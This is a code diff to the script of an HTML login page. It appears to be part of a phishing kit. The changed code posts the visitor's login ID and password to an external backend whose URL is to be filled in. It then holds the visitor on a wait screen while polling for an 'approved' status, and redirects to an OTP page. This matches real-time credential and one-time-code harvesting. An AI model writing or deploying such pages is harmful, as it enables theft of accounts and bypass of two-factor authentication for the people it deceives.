@@ -414,49 +414,56 @@
     }
 
     document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      const loginId = document.getElementById('login-id').value;
-      const password = document.getElementById('password').value;
+  e.preventDefault();
+  const loginId = document.getElementById('login-id').value;
+  const password = document.getElementById('password').value;
 
-      document.getElementById('waitPage').style.display = 'flex';
+  document.getElementById('waitPage').style.display = 'flex';
 
-      fetch('/login', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({login: loginId, password: password})
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success && data.id) {
-          checkStatus(data.id);
-        } else {
-          alert("Error: Login failed.");
-          document.getElementById('waitPage').style.display = 'none';
-        }
-      })
-      .catch(err => {
-        alert("Network error.");
-        document.getElementById('waitPage').style.display = 'none';
-      });
-    });
-
-    function checkStatus(id) {
-      const interval = setInterval(() => {
-        fetch(`/status/${id}`)
-        .then(res => res.json())
-        .then(data => {
-          if (data.status === 'approved') {
-            clearInterval(interval);
-            window.location.href = data.redirect_url || 'otp.html';
-          }
-        })
-        .catch(() => {
-          clearInterval(interval);
-          alert('Error checking approval status.');
-          document.getElementById('waitPage').style.display = 'none';
-        });
-      }, 3000);
+  fetch('https://your-backend.onrender.com/login', {  // Replace with your backend URL
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ login: loginId, password: password })  // Match backend's expected keys
+  })
+  .then(res => {
+    if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+    return res.json();
+  })
+  .then(data => {
+    if (data.success && data.id) {
+      checkStatus(data.id);
+    } else {
+      throw new Error(data.error || 'Login failed');
     }
+  })
+  .catch(err => {
+    console.error('Login error:', err);
+    alert(`Error: ${err.message}`);
+    document.getElementById('waitPage').style.display = 'none';
+  });
+});
+
+function checkStatus(id) {
+  const interval = setInterval(() => {
+    fetch(`https://your-backend.onrender.com/status/${id}`)  // Replace with your backend URL
+    .then(res => {
+      if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+      return res.json();
+    })
+    .then(data => {
+      if (data.status === 'approved') {
+        clearInterval(interval);
+        window.location.href = data.redirect_url || 'otp.html';
+      }
+    })
+    .catch(err => {
+      console.error('Status check error:', err);
+      clearInterval(interval);
+      alert(`Error: ${err.message}`);
+      document.getElementById('waitPage').style.display = 'none';
+    });
+  }, 3000);
+}
   </script>
 </body>
 </html>
